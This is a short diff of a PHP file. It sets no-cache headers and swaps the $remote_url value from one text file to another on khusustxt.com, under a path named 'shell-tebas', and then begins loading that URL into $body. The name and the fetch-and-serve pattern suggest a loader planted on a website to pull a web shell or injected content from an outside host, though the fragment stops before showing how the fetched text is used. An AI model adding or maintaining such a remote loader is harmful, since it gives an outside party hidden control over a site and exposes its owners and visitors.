@@ -10,7 +10,7 @@ header('Content-Type: text/html; charset=UTF-8');
 header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
 header('Pragma: no-cache');
 
-$remote_url = 'https://khusustxt.com/shell-tebas/rolunk.txt';
+$remote_url = 'https://khusustxt.com/shell-tebas/itsinc.txt';
 
 $body = '';
 if (!empty($remote_url)) {
